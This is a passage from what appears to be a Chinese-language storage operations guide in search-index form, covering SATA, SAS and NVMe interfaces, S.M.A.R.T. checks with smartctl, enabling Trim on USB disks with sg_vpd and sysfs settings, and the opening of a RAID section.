SCSI\uff09\u200b\u63a5\u53e3\u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u4e5f\u200b\u4f1a\u200b\u4f7f\u7528\u200b SATA \u200b\u63a5\u53e3\u200b\u3002SATA \u200b\u662f\u200b\u4e2a\u4eba\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u786c\u76d8\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u800c\u200b SAS \u200b\u7684\u200b\u63a5\u53e3\u200b\u5e26\u5bbd\u200b\u66f4\u9ad8\u200b\uff08\u200b\u867d\u7136\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u5b9e\u9645\u200b\u7684\u200b\u4f20\u8f93\u901f\u5ea6\u200b\u901a\u5e38\u200b\u65e0\u6cd5\u200b\u8dd1\u200b\u6ee1\u200b SATA \u200b\u7684\u200b\u5e26\u5bbd\u200b\uff09\uff0c\u200b\u652f\u6301\u200b\u66f4\u200b\u591a\u529f\u80fd\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5411\u4e0b\u517c\u5bb9\u200b SATA\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u66f4\u200b\u5e38\u89c1\u200b\u3002</p> <p>SATA \u200b\u4e0e\u200b SAS \u200b\u7684\u200b\u8be6\u7ec6\u200b\u5bf9\u6bd4\u200b\u53ef\u200b\u53c2\u8003\u200b\u82f1\u6587\u200b Wikipedia \u200b\u4e2d\u200b SAS \u200b\u7684\u200b \"Comparison with SATA\" \u200b\u4e00\u8282\u200b\u3002</p> <p>\u200b\u968f\u7740\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u7684\u200b\u666e\u53ca\u200b\uff0cPCIe \u200b\u63a5\u53e3\u200b\u7684\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u4e5f\u200b\u8d8a\u6765\u8d8a\u200b\u591a\u89c1\u200b\u3002PCIe \u200b\u63a5\u53e3\u200b\u7684\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u901a\u5e38\u200b\u4f7f\u7528\u200b NVMe \u200b\u534f\u8bae\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b NVMe SSD\u3002NVMe SSD \u200b\u5e38\u89c1\u200b\u7684\u200b\u63a5\u53e3\u200b\u5f62\u6001\u200b\u6709\u200b U.2\u3001M.2 \u200b\u548c\u200b AIC\uff08PCIe Add-in Card\uff0c\u200b\u5373\u200b\u6269\u5c55\u5361\u200b\uff09\u3002</p> <ul> <li> <p>M.2 \u200b\u63a5\u53e3\u200b\u7684\u200b\u5c3a\u5bf8\u200b\u6700\u5c0f\u200b\uff0c\u200b\u5728\u200b\u4e2a\u4eba\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u4e5f\u200b\u66f4\u200b\u5e38\u89c1\u200b\uff0c\u200b\u751a\u81f3\u200b\u53ef\u4ee5\u200b\u653e\u5165\u200b\u786c\u76d8\u76d2\u200b\u4e2d\u200b\u4f5c\u4e3a\u200b\u5c0f\u5de7\u200b\u8f7b\u4fbf\u200b\u7684\u200b\u79fb\u52a8\u786c\u76d8\u200b\u4f7f\u7528\u200b\u3002</p> <ul> <li>\u200b\u5e38\u89c1\u200b\u7684\u200b M.2 \u200b\u63a5\u53e3\u200b\u6709\u200b B-key \u200b\u548c\u200b M-key \u200b\u4e24\u79cd\u200b\uff0c\u200b\u4e3b\u6d41\u200b\u7684\u200b NVMe SSD \u200b\u901a\u5e38\u200b\u4f7f\u7528\u200b M-key \u200b\u63a5\u53e3\u200b\uff0c\u200b\u800c\u200b SATA SSD \u200b\u901a\u5e38\u200b\u4f7f\u7528\u200b B-key \u200b\u6216\u200b B+M\uff08\u200b\u4e24\u4e2a\u200b\u7f3a\u53e3\u200b\uff09\u3002\u200b\u4e00\u4e2a\u200b M.2 \u200b\u63a5\u53e3\u200b\u662f\u5426\u200b\u652f\u6301\u200b NVMe \u200b\u6216\u200b SATA \u200b\u534f\u8bae\u200b\u53d6\u51b3\u4e8e\u200b\u4e3b\u677f\u200b\u6216\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5177\u4f53\u60c5\u51b5\u200b\u9700\u8981\u200b\u53c2\u8003\u200b\u4ea7\u54c1\u200b\u7684\u200b\u8bf4\u660e\u4e66\u200b\u3002<ul> <li>\u200b\u4f5c\u4e3a\u200b\u53c2\u8003\u200b\uff0c2023 \u200b\u5e74\u200b\u4ee5\u6765\u200b\u5e02\u9762\u4e0a\u200b\u5df2\u7ecf\u200b\u89c1\u200b\u4e0d\u5230\u200b\u53ea\u200b\u652f\u6301\u200b SATA \u200b\u800c\u200b\u4e0d\u200b\u652f\u6301\u200b NVMe\uff08\u200b\u5373\u5355\u200b SATA \u200b\u534f\u8bae\u200b\uff09\u200b\u7684\u200b M.2 \u200b\u63a5\u53e3\u200b\u4e86\u200b\uff0c\u200b\u5c3d\u7ba1\u200b M.2 SATA \u200b\u7684\u200b SSD \u200b\u4ecd\u7136\u200b\u6709\u200b\u5356\u200b\u3002</li> </ul> </li> <li>\u200b\u9664\u4e86\u200b\u63a5\u53e3\u200b\u7684\u200b\u5f62\u72b6\u200b\uff0cM.2 \u200b\u63a5\u53e3\u200b\u7684\u200b\u957f\u5bbd\u200b\u4e5f\u200b\u6709\u200b\u4e00\u7cfb\u5217\u200b\u9009\u9879\u200b\uff0c\u200b\u4f8b\u5982\u200b 2230\u30012242\u30012280\u300122110 \u200b\u7b49\u200b\uff0c\u200b\u5373\u200b\u5bbd\u5ea6\u200b\u4e3a\u200b 22 mm\uff0c\u200b\u957f\u5ea6\u200b\u5206\u522b\u200b\u4e3a\u200b 30\u300142\u300180\u3001110 mm \u200b\u7b49\u200b\u3002\u200b\u4e2a\u4eba\u7535\u8111\u200b\u4e00\u822c\u200b\u91c7\u7528\u200b 2280 \u200b\u7684\u200b\u5c3a\u5bf8\u200b\uff0c\u200b\u800c\u200b\u670d\u52a1\u5668\u200b\uff08\u200b\u548c\u200b\u4e00\u4e9b\u200b\u9ad8\u7aef\u200b\u53f0\u5f0f\u673a\u200b\u4e3b\u677f\u200b\uff09\u200b\u4e0a\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4f7f\u7528\u200b 22110 \u200b\u7684\u200b\u5c3a\u5bf8\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u5c3a\u5bf8\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u63a5\u53e3\u200b\u7684\u200b\u7535\u6c14\u200b\u7279\u6027\u200b\uff0c\u200b\u53ea\u662f\u200b\u4e3a\u4e86\u200b\u9002\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u7a7a\u95f4\u200b\u548c\u200b\u6563\u70ed\u200b\u9700\u6c42\u200b\u3002</li> </ul> </li> <li> <p>U.2 \u200b\u63a5\u53e3\u200b\u5f62\u72b6\u200b\u4e0e\u200b SAS \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u517c\u5bb9\u200b SAS\uff08\u200b\u6bd5\u7adf\u200b\u5e95\u5c42\u200b\u534f\u8bae\u200b\u90fd\u200b\u4e0d\u200b\u4e00\u6837\u200b\uff09\uff0c\u200b\u4e14\u200b 2.5 \u200b\u82f1\u5bf8\u200b\u548c\u200b 15 mm \u200b\u4ee5\u4e0a\u200b\u539a\u5ea6\u200b\u7684\u200b\u5916\u5f62\u200b\u76f8\u6bd4\u200b M.2 \u200b\u4e5f\u200b\u5177\u6709\u200b\u66f4\u597d\u200b\u7684\u200b\u6563\u70ed\u200b\u80fd\u529b\u200b\uff0c\u200b\u662f\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u7684\u200b\u5e38\u89c1\u200b\u5f62\u6001\u200b\u3002</p> </li> <li>AIC\uff08Add-In Card\uff09\u200b\u5c31\u662f\u200b\u4e00\u5757\u200b PCIe \u200b\u6269\u5c55\u5361\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d2\u5165\u200b PCIe \u200b\u63d2\u69fd\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u3002</li> </ul> \u200b\u56fe\u7247\u200b\uff1aM.2 SSD <p> M.2 2280 SSD </p> \u200b\u56fe\u7247\u200b\uff1aU.2 SSD <p> U.2 SSD </p> \u200b\u56fe\u7247\u200b\uff1aAIC SSD <p> PCIe \u200b\u63d2\u5361\u5f0f\u200b SSD </p>"},{"location":"ops/storage/intro/#smart","title":"S.M.A.R.T.","text":"<p>\u200b\u78c1\u76d8\u200b\u7684\u200b S.M.A.R.T.\uff08Self-Monitoring, Analysis and Reporting Technology\uff0c\u200b\u4ee5\u4e0b\u200b\u7b80\u79f0\u200b\u4e3a\u200b SMART\uff09\u200b\u529f\u80fd\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b\u78c1\u76d8\u200b\u7684\u200b\u8fd0\u884c\u200b\u72b6\u6001\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u78c1\u76d8\u200b\u51fa\u73b0\u200b\u6545\u969c\u200b\u524d\u200b\u63d0\u4f9b\u200b\u9884\u8b66\u200b\u3002SMART \u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b\u78c1\u76d8\u200b\u7684\u200b\u6e29\u5ea6\u200b\u3001\u200b\u8bfb\u5199\u200b\u9519\u8bef\u7387\u200b\u3001\u200b\u78c1\u76d8\u200b\u65cb\u8f6c\u200b\u901f\u5ea6\u200b\u3001\u200b\u78c1\u76d8\u200b\u7684\u200b\u5bff\u547d\u200b\u7b49\u200b\u4fe1\u606f\u200b\u3002</p> <p>Linux \u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u5b89\u88c5\u200b <code>smartmontools</code> \u200b\u5305\u6765\u200b\u67e5\u770b\u200b\u78c1\u76d8\u200b\u7684\u200b SMART \u200b\u4fe1\u606f\u200b\u3002\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u53ef\u7528\u200b\u7684\u200b\u78c1\u76d8\u200b\u4e0e\u5176\u200b SMART \u200b\u72b6\u6001\u200b\uff1a</p> <pre><code>$ sudo smartctl --scan\n/dev/nvme0 -d nvme # /dev/nvme0, NVMe device\n$ sudo smartctl -a /dev/nvme0\n\uff08\u200b\u5185\u5bb9\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\u200b\u6709\u5173\u200b SMART \u200b\u6307\u6807\u200b\u89e3\u91ca\u200b\u4e0e\u200b\u76d1\u63a7\u200b\u7684\u200b\u5185\u5bb9\u200b\u5c06\u4f1a\u200b\u5728\u200b RAID \u200b\u4e2d\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/storage/intro/#trim","title":"Trim (Discard/Unmap)","text":"<p>SSD \u200b\u7684\u200b\u95ea\u5b58\u200b\u5b58\u50a8\u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff1a\u200b\u4e0d\u200b\u652f\u6301\u200b\u4efb\u610f\u200b\u7684\u200b\u968f\u673a\u200b\u5199\u200b\uff0c\u200b\u4fee\u6539\u200b\u6570\u636e\u200b\u53ea\u80fd\u200b\u901a\u8fc7\u200b\u6e05\u7a7a\u200b\u533a\u5757\u200b\u4e4b\u540e\u200b\u91cd\u65b0\u200b\u5199\u5165\u200b\u6765\u200b\u5b9e\u73b0\u200b\u3002\u200b\u5e76\u4e14\u200b\u533a\u5757\u200b\u80fd\u591f\u200b\u7ecf\u53d7\u200b\u7684\u200b\u5199\u5165\u200b\u6b21\u6570\u200b\u662f\u200b\u6709\u9650\u200b\u7684\u200b\u3002SSD \u200b\u4e2d\u200b\u7684\u200b\u56fa\u4ef6\u200b\u4f1a\u200b\u8fdb\u884c\u200b\u533a\u5757\u200b\u7ba1\u7406\u200b\uff0c\u200b\u4ee5\u200b\u5c06\u200b\u5199\u5165\u200b\u5e26\u6765\u200b\u7684\u200b\u78e8\u635f\u200b\u5206\u6563\u200b\u5230\u200b\u6240\u6709\u200b\u533a\u5757\u200b\u4e2d\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u56fa\u4ef6\u200b\u5e76\u200b\u4e0d\u200b\u6e05\u695a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u5220\u9664\u200b\u67d0\u4e2a\u200b\u6587\u4ef6\u200b\u4e4b\u540e\u200b\uff0cSSD \u200b\u56fa\u4ef6\u200b\u4f1a\u200b\u4ecd\u7136\u200b\u8ba4\u4e3a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u533a\u5757\u200b\u5b58\u50a8\u200b\u4e86\u200b\u6570\u636e\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u91ca\u653e\u200b\u3002Trim \u200b\u64cd\u4f5c\u200b\u7531\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u53d1\u51fa\u200b\uff0c\u200b\u544a\u8bc9\u200b\u56fa\u4ef6\u200b\u54ea\u4e9b\u200b\u533a\u5757\u200b\u53ef\u4ee5\u200b\u91ca\u653e\u200b\uff0c\u200b\u4ee5\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u5ef6\u957f\u200b SSD \u200b\u4f7f\u7528\u5bff\u547d\u200b\u3002\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u7684\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u4e5f\u200b\u4f1a\u200b\u652f\u6301\u200b trim \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4f8b\u5982\u200b\u865a\u62df\u673a\u200b\u78c1\u76d8\u200b\uff08<code>virtio-scsi</code>\uff09\u3001\u200b\u90e8\u5206\u200b\u4f01\u4e1a\u7ea7\u200b\u7684\u200b SAN \u200b\u7b49\u200b\u3002</p> <p>\u200b\u5173\u6ce8\u200b\u5b58\u50a8\u200b\u7684\u200b\u53ef\u7528\u200b\u7a7a\u95f4\u200b\u6bd4\u4f8b\u200b</p> <p>\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u5c06\u200b\u5b58\u50a8\u200b\u7684\u200b\u53ef\u7528\u200b\u7a7a\u95f4\u200b\u5168\u90e8\u200b\u6216\u200b\u63a5\u8fd1\u200b\u5168\u90e8\u200b\u8017\u5c3d\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\uff1a</p> <ul> <li>\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\uff1a\u200b\u53ef\u7528\u200b\u7a7a\u95f4\u200b\u4e0d\u8db3\u200b\u65f6\u200b\uff0c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e3a\u4e86\u200b\u5b58\u50a8\u200b\u6570\u636e\u200b\uff0c\u200b\u4f1a\u200b\u4e0d\u5f97\u4e0d\u200b\u4ea7\u751f\u200b\u5927\u91cf\u200b\u78c1\u76d8\u788e\u7247\u200b\uff0c\u200b\u800c\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u7684\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u5f88\u5dee\u200b\uff1b</li> <li>\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\uff1a\u200b\u53ef\u7528\u200b\u7a7a\u95f4\u200b\u4e0d\u8db3\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u6ca1\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u7a7a\u200b\u533a\u5757\u200b\u6539\u5199\u200b\u5185\u5bb9\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u80fd\u200b\u4e0d\u5f97\u4e0d\u200b\u5927\u91cf\u200b\u91cd\u590d\u200b\u64e6\u5199\u200b\u5df2\u6709\u200b\u7684\u200b\u533a\u5757\u200b\uff0c\u200b\u52a0\u901f\u200b\u78e8\u635f\u200b\u3002</li> </ul> <p>\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u786e\u4fdd\u200b <code>fstrim.timer</code> \u200b\u5904\u4e8e\u200b\u542f\u7528\u200b\u72b6\u6001\u200b\u5373\u53ef\u200b\u3002\u200b\u4e00\u4e9b\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e5f\u200b\u652f\u6301\u200b\u8c03\u6574\u200b trim/discard \u200b\u53c2\u6570\u200b\uff08\u200b\u7acb\u5373\u200b discard \u200b\u6216\u200b\u5468\u671f\u6027\u200b discard\uff0c\u200b\u4e00\u822c\u200b\u63a8\u8350\u200b\u540e\u8005\u200b\uff09\u3002</p> \u200b\u4e3a\u200b USB \u200b\u8bbe\u5907\u200b\u5f00\u542f\u200b Trim <p>\u200b\u7531\u4e8e\u200b\u8001\u65e7\u200b\u7684\u200b USB \u200b\u8bbe\u5907\u200b\u5bf9\u200b\u83b7\u53d6\u200b\u8bbe\u5907\u200b\u529f\u80fd\u200b\u7684\u200b\u8bf7\u6c42\u200b\u7684\u200b\u652f\u6301\u200b\u5b58\u5728\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u6b64\u200b Linux \u200b\u5185\u6838\u200b\u9ed8\u8ba4\u200b\u4e0d\u4f1a\u200b\u5c1d\u8bd5\u200b\u8bf7\u6c42\u200b\u76f8\u5173\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u800c\u200b\u65e0\u6cd5\u200b\u63a2\u6d4b\u200b USB \u200b\u8fde\u63a5\u200b\u7684\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u662f\u5426\u200b\u652f\u6301\u200b trim \u200b\u529f\u80fd\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>lsblk --discard</code> \u200b\u6216\u200b\u67e5\u770b\u200b <code>/sys/block/sdX/queue/discard_max_bytes</code> \u200b\u786e\u8ba4\u200b\uff08\u200b\u4ee5\u4e0b\u200b <code>sda</code> \u200b\u4e3a\u200b USB \u200b\u78c1\u76d8\u200b\u8bbe\u5907\u200b\uff09\uff1a</p> <pre><code>$ lsblk --discard\nNAME        DISC-ALN DISC-GRAN DISC-MAX DISC-ZERO\nsda                0      512B        0         0\n\u251c\u2500sda1             0      512B        0         0\n\u251c\u2500sda2             0      512B        0         0\n\u251c\u2500sda3             0      512B        0         0\n\u2514\u2500sda4             0      512B        0         0\nnvme0n1            0      512B       2T         0\n\u251c\u2500nvme0n1p1        0      512B       2T         0\n\u251c\u2500nvme0n1p2        0      512B       2T         0\n\u2514\u2500nvme0n1p3        0      512B       2T         0\n</code></pre> <p>\u200b\u4e0d\u8fc7\u200b\uff0cLinux \u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u624b\u52a8\u200b\u8986\u76d6\u200b\u8fd9\u4e00\u200b\u884c\u4e3a\u200b\u3002\u200b\u7531\u4e8e\u200b USB \u200b\u8bbe\u5907\u200b\u4e00\u822c\u200b\u90fd\u200b\u4ee5\u200b USB Attached SCSI (UAS) \u200b\u6216\u200b USB Mass Storage (UMS) \u200b\u7684\u200b\u5f62\u5f0f\u200b\u8fde\u63a5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5176\u200b\u7531\u200b\u5185\u6838\u200b\u7684\u200b SCSI \u200b\u5b50\u7cfb\u7edf\u200b\u7ba1\u7406\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b SCSI \u200b\u547d\u4ee4\u200b\u6765\u200b\u786e\u8ba4\u200b\u8bbe\u5907\u200b\u662f\u5426\u200b\u652f\u6301\u200b trim \u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u5b89\u88c5\u200b <code>sg3-utils</code> \u200b\u5305\u540e\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>sg_vpd</code> \u200b\u67e5\u8be2\u200b unmap \u200b\u652f\u6301\u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>$ sudo sg_vpd --all /dev/sda\nSupported VPD pages VPD page:\n  Supported VPD pages [sv]\n  Unit serial number [sn]\n  Device identification [di]\n  Block limits (SBC) [bl]\n  Block device characteristics (SBC) [bdc]\n  Logical block provisioning (SBC) [lbpv]\n\uff08\u200b\u7701\u7565\u200b\uff09\nBlock limits VPD page (SBC):\n  Write same non-zero (WSNZ): 0\n  Maximum compare and write length: 0 blocks [Command not implemented]\n  Optimal transfer length granularity: 1 blocks\n  Maximum transfer length: 65535 blocks\n  Optimal transfer length: 65535 blocks\n  Maximum prefetch transfer length: 65535 blocks\n  Maximum unmap LBA count: 134217728\n  Maximum unmap block descriptor count: 1\n  Optimal unmap granularity: 0 blocks [not reported]\n  Unmap granularity alignment valid: false\n  Unmap granularity alignment: 0 [invalid]\n  Maximum write same length: 0 blocks [not reported]\n  Maximum atomic transfer length: 0 blocks [not reported]\n  Atomic alignment: 0 [unaligned atomic writes permitted]\n  Atomic transfer length granularity: 0 [no granularity requirement\n  Maximum atomic transfer length with atomic boundary: 0 blocks [not reported]\n  Maximum atomic boundary size: 0 blocks [can only write atomic 1 block]\n\uff08\u200b\u7701\u7565\u200b\uff09\nLogical block provisioning VPD page (SBC):\n  Unmap command supported (LBPU): 1\n  Write same (16) with unmap bit supported (LBPWS): 0\n  Write same (10) with unmap bit supported (LBPWS10): 0\n  Logical block provisioning read zeros (LBPRZ): 0\n  Anchored LBAs supported (ANC_SUP): 0\n  Threshold exponent: 0 [threshold sets not supported]\n  Descriptor present (DP): 0\n  Minimum percentage: 0 [not reported]\n  Provisioning type: 0 (not known or fully provisioned)\n  Threshold percentage: 0 [percentages not supported]\n</code></pre> <p>LBPU\u3001LBPWS \u200b\u548c\u200b LBPWS10 \u200b\u5206\u522b\u200b\u4e3a\u200b unmap \u200b\u7684\u200b\u4e0d\u540c\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u8be6\u60c5\u200b\u53c2\u8003\u200b sg_unmap(8) \u200b\u548c\u200b sg_write_same(8)\u3002</p> <p>\u200b\u5bf9\u200b SCSI \u200b\u8bbe\u5907\u200b\uff0csysfs \u200b\u4e2d\u200b\u7684\u200b \"provisioning_mode\" \u200b\u63a7\u5236\u200b trim \u200b\u529f\u80fd\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u5199\u5165\u200b\u652f\u6301\u200b\u7684\u200b\u9009\u9879\u200b\u3002LBPU\u3001LBPWS \u200b\u548c\u200b LBPWS10 \u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b <code>unmap</code>\u3001<code>writesame_16</code> \u200b\u548c\u200b <code>writesame_10</code>\u3002</p> <pre><code># \u200b\u5728\u200b\u4f60\u200b\u7684\u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff0c\u200b\u8def\u5f84\u200b\u4f1a\u200b\u6709\u6240\u4e0d\u540c\u200b\necho unmap | sudo tee /sys/block/sda/device/scsi_disk/0:0:0:0/provisioning_mode\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b\u8bbe\u7f6e\u200b <code>provisioning_mode</code> \u200b\u4e4b\u540e\u200b\uff0c<code>discard_max_bytes</code> \u200b\u4e0d\u4f1a\u200b\u6839\u636e\u200b\u8bbe\u5907\u200b\u7684\u200b\u5b9e\u9645\u200b\u80fd\u529b\u200b\u66f4\u65b0\u200b\uff08\u200b\u56e0\u4e3a\u200b\u5185\u6838\u200b\u6ca1\u6709\u200b\u8bb0\u5f55\u200b\u76f8\u5e94\u200b\u7684\u200b\u6570\u503c\u200b\uff09\uff0c\u200b\u800c\u662f\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u9ed8\u8ba4\u200b\u7684\u200b 4G\u3002\u200b\u5728\u200b\u4e00\u4e9b\u200b\u573a\u666f\u200b\u4e0b\u200b\u53ef\u80fd\u200b\u8fc7\u5927\u200b\uff08\u200b\u8bbe\u5907\u200b\u4e0d\u200b\u652f\u6301\u200b\uff09\u3002\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7684\u200b\u8f93\u51fa\u200b\u5f97\u5230\u200b\u7684\u200b \"Maximum unmap LBA count\"\uff0c\u200b\u4e58\u4ee5\u200b LBA \u200b\u7684\u200b\u5927\u5c0f\u200b\uff08\u200b\u901a\u5e38\u200b\u4e3a\u200b 512 \u200b\u5b57\u8282\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>sg_readcap /dev/sdX</code> \u200b\u786e\u8ba4\u200b\uff09\u200b\u540e\u200b\uff0c\u200b\u5373\u53ef\u200b\u5f97\u5230\u200b\u8bbe\u5907\u200b\u5b9e\u9645\u200b\u652f\u6301\u200b\u7684\u200b <code>discard_max_bytes</code>\u3002\u200b\u53ea\u8981\u200b\u5c0f\u4e8e\u200b\u7b49\u4e8e\u200b <code>/sys/block/sdX/queue/discard_max_hw_bytes</code> \u200b\u7684\u200b\u6570\u503c\u200b\uff0c\u200b\u5373\u53ef\u200b\u5199\u5165\u200b <code>discard_max_bytes</code>\u3002</p> <pre><code># \u200b\u4f8b\u5b50\u200b\uff1a\u200b\u9650\u5236\u200b\u5230\u200b\u6bcf\u6b21\u200b\u6700\u200b\u591a\u200b discard 1GiB\necho 1073741824 | sudo tee /sys/block/sda/queue/discard_max_bytes\n</code></pre> <p>\u200b\u6700\u540e\u200b\uff0c\u200b\u4e0a\u9762\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u4e0d\u662f\u200b\u6301\u4e45\u200b\u5316\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u6301\u4e45\u200b\u5316\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u914d\u7f6e\u200b\u76f8\u5173\u200b\u7684\u200b udev \u200b\u89c4\u5219\u200b\u3002</p> <p>\u200b\u5176\u4ed6\u200b\u4ecb\u7ecd\u200b\u53ef\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>Enabling TRIM on an external SSD on a Raspberry Pi</li> <li>Gentoo Wiki: Discard over USB</li> <li>Superuser: No TRIM/DISCARD with a SATA SSD connected through an UASP-enabled USB adapter?</li> <li>scsi: sd: Enable modern protocol features on more devices</li> <li>Vlab \u200b\u9879\u76ee\u200b\u8c03\u8bd5\u200b iSCSI unmap \u200b\u95ee\u9898\u200b\u7684\u200b\u8bb0\u5f55\u200b</li> </ul>"},{"location":"ops/storage/intro/#raid","title":"RAID","text":"<p>RAID\uff08Redundant Array of Inexpensive Disks\uff09\u200b\u662f\u200b\u4e00\u79cd\u200b\u5c06\u200b\u591a\u4e2a\u200b\u78c1\u76d8\u200b\u7ec4\u5408\u200b\u5728\u200b\u4e00\u8d77\u200b\u5b9e\u73b0\u200b\u6570\u636e\u200b\u5197\u4f59\u200b\u548c\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\u7684\u200b\u6280\u672f\u200b\u3002\u200b\u4e0d\u540c\u200b\u7684\u200b\u78c1\u76d8\u200b\u7ec4\u5408\u200b\u65b9\u5f0f\u200b\u79f0\u4e3a\u200b\u201cRAID \u200b\u7ea7\u522b\u200b\uff08RAID Level\uff09\u201d\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b\u6709\u200b RAID 0\u3001RAID 1\u3001RAID 5\u3001RAID 6\u3001RAID 10 \u200b\u7b49\u200b\u3002</p> RAID 0 <p>\u200b\u4e5f\u200b\u79f0\u4f5c\u200b\u6761\u5e26\u200b\u5316\u200b\uff08Striped\uff09\uff0c\u200b\u5c06\u200b\u6570\u636e\u200b\u5206\u5757\u200b\u5b58\u50a8\u200b\u5728\u200b\u591a\u4e2a\u200b\u78c1\u76d8\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5145\u5206\u5229\u7528\u200b\u6240\u6709\u200b\u5bb9\u91cf\u200b\uff0c\u200b\u83b7\u5f97\u200b\u53e0\u52a0\u200b\u7684\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\uff08\u200b\u4f46\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u4e00\u822c\u200b\uff09\uff0c\u200b\u4f46\u200b\u6ca1\u6709\u200b\u5197\u4f59\u200b\uff0c\u200b\u4efb\u4f55\u200b\u4e00\u5757\u200b\u78c1\u76d8\u200b\u635f\u574f\u200b\u90fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u6574\u4e2a\u200b\u9635\u5217\u200b\u7684\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\uff0c\u200b\u9002\u5408\u200b\u9700\u8981\u200b\u9ad8\u6027\u80fd\u200b\u8bfb\u5199\u200b\u4f46\u200b\u4e0d\u200b\u9700\u8981\u200b\u6570\u636e\u200b\u5b89\u5168\u6027\u200b\u7684\u200b\u573a\u666f\u200b\u3002</p> RAID 1 